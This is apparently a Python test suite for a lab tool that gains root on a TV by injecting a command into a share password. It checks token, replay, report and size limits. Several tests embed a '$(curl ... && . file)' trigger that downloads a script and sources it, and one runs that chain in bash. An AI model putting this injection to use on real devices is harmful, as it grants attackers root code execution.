"""Offline HTTP integration checks for the bounded inventory receiver."""
import http.client
import importlib.util
import json
import os
import shutil
import socket
import subprocess
from pathlib import Path
import tempfile
import threading
import unittest

spec = importlib.util.spec_from_file_location('bridge', Path(__file__).with_name('root-bridge.py'))
bridge = importlib.util.module_from_spec(spec)
spec.loader.exec_module(bridge)
TOKEN = 'a' * 24
paste_spec = importlib.util.spec_from_file_location('paste', Path(__file__).with_name('paste-password.py'))
paste = importlib.util.module_from_spec(paste_spec)
paste_spec.loader.exec_module(paste)
REPORT = b'DANSTV-ROOT-CHANNEL mode=Snapshot\nDANSTV-EUID=0\nstdout and stderr\nDANSTV-EXIT=0\nDANSTV-END-OF-REPORT\n'


class TransportTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.output = Path(self.directory.name) / 'report.txt'
        self.server = bridge.SnapshotServer(('127.0.0.1', 0), '127.0.0.1', TOKEN, self.output)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()
        self.directory.cleanup()

    def request(self, method, path, body=None, headers=None):
        connection = http.client.HTTPConnection(*self.server.server_address, timeout=4)
        connection.request(method, path, body=body, headers=headers or {})
        response = connection.getresponse()
        result = response.status, response.read()
        connection.close()
        return result

    def fetch(self):
        return self.request('GET', '/d/' + TOKEN)

    def test_roundtrip_and_replay(self):
        status, script = self.fetch()
        self.assertEqual(status, 200)
        self.assertIn(b'2>&1', script)
        self.assertEqual(self.fetch()[0], 409)
        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 204)
        self.assertEqual(self.output.read_bytes(), REPORT)
        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 409)

    def test_token_and_source_restrictions(self):
        self.assertEqual(self.request('GET', '/d/' + 'b' * 24)[0], 404)
        self.server.tv = '192.0.2.1'
        self.assertEqual(self.fetch()[0], 404)
        self.assertFalse(self.output.exists())

    def test_result_requires_fetch_root_and_success(self):
        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 409)
        self.fetch()
        for bad in (REPORT.replace(b'EUID=0', b'EUID=901'),
                    REPORT.replace(b'EXIT=0', b'EXIT=1'), REPORT[:-8]):
            self.assertEqual(self.request('POST', '/r/' + TOKEN, bad)[0], 422)
        self.assertFalse(self.output.exists())

    def test_length_limit_and_existing_backup(self):
        self.fetch()
        self.assertEqual(self.request('POST', '/r/' + TOKEN, b'', {'Content-Length': str(bridge.LIMIT + 1)})[0], 413)
        self.output.write_bytes(b'original')
        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 409)
        self.assertEqual(self.output.read_bytes(), b'original')

    def test_payload_rejects_command_and_token_injection(self):
        with self.assertRaises(ValueError):
            bridge.command_text('Apply', '127.0.0.1', TOKEN)
        with self.assertRaises(ValueError):
            bridge.command_text('Snapshot', '127.0.0.1', 'x;id')

    def test_shutdown_revokes_listener(self):
        address = self.server.server_address
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2)
        self.assertFalse(self.thread.is_alive())
        with self.assertRaises(OSError):
            socket.create_connection(address, timeout=1)

    def test_snapshot_password_matches_session_and_rejects_stale_or_modified(self):
        lab = Path(self.directory.name)
        token = TOKEN
        tmp = '/tmp/dtv' + token[:6]
        trigger = ('$(/usr/bin/curl${IFS}-fsS${IFS}http://192.0.2.10:8181/d/' +
                   token + '>' + tmp + '&&.${IFS}' + tmp + ')')
        self.assertLessEqual(len(trigger), 160)
        (lab / 'lab.env').write_text('TVPROBE_PASSWORD=' + trigger, encoding='ascii')
        (lab / 'lab.env.before-snapshot').touch()
        (lab / 'ownership.json').write_text(json.dumps({'pc': '192.0.2.10',
            'tv': '192.0.2.20', 'user': 'danstvprobe', 'share': 'DansTVProbe'}), encoding='utf-8')
        (lab / 'snapshot-session.json').write_text(json.dumps({
            'token': token, 'host': '192.0.2.10', 'tv': '192.0.2.20'}), encoding='ascii')
        self.assertEqual(paste.prepared_password(lab), trigger)
        (lab / 'lab.env').write_text('TVPROBE_PASSWORD=' + trigger + ';id', encoding='ascii')
        with self.assertRaises(ValueError):
            paste.prepared_password(lab)
        (lab / 'lab.env.before-uid').touch()
        with self.assertRaises(ValueError):
            paste.prepared_password(lab)

    def test_ordinary_password_requires_restored_owned_lab(self):
        lab = Path(self.directory.name)
        original = 'TvA9A1B2C3D4E5F6'
        env = lab / 'lab.env'
        env.write_text('TVPROBE_USER=danstvprobe\nTVPROBE_PASSWORD=' + original + '\n', encoding='ascii')
        owner = lab / 'ownership.json'
        owner.write_text(json.dumps({'user': 'danstvprobe', 'share': 'DansTVProbe'}), encoding='utf-8')
        self.assertEqual(paste.normal_password(lab), original)
        for marker in ('lab.env.before-uid', 'lab.env.before-snapshot', 'snapshot-session.json'):
            path = lab / marker
            path.touch()
            with self.assertRaises(ValueError):
                paste.normal_password(lab)
            path.unlink()
        for invalid in ('$(/usr/bin/curl${IFS}http://test)', 'TvA9abc123', 'a' * 16):
            env.write_text('TVPROBE_PASSWORD=' + invalid + '\n', encoding='ascii')
            with self.assertRaises(ValueError):
                paste.normal_password(lab)
        env.write_text('TVPROBE_PASSWORD=' + original + '\nTVPROBE_PASSWORD=' + original + '\n',
                       encoding='ascii')
        with self.assertRaises(ValueError):
            paste.normal_password(lab)
        env.write_text('TVPROBE_PASSWORD=' + original + '\n', encoding='ascii')
        owner.write_text(json.dumps({'user': 'other', 'share': 'DansTVProbe'}), encoding='utf-8')
        with self.assertRaises(ValueError):
            paste.normal_password(lab)

    @unittest.skipUnless(os.name == 'posix' and shutil.which('bash') and Path('/usr/bin/curl').exists()
                         and os.geteuid() == 0, 'requires disposable Linux root test container')
    def test_actual_bash_download_source_report_and_cleanup(self):
        # Exercise the real curl/source/POST chain against Linux, never a TV.
        port = self.server.server_address[1]
        self.server.payload = self.server.payload.replace(b':8181/', f':{port}/'.encode())
        tmp = '/tmp/dtv' + TOKEN[:6]
        trigger = ('$(/usr/bin/curl${IFS}-fsS${IFS}http://127.0.0.1:' + str(port) +
                   '/d/' + TOKEN + '>' + tmp + '&&.${IFS}' + tmp + ')')
        result = subprocess.run(['bash', '-c', trigger], capture_output=True, timeout=35)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertTrue(self.server.received)
        self.assertTrue(bridge.valid_report(self.output.read_bytes()))
        self.assertFalse(Path(tmp).exists())


if __name__ == '__main__':
    unittest.main()
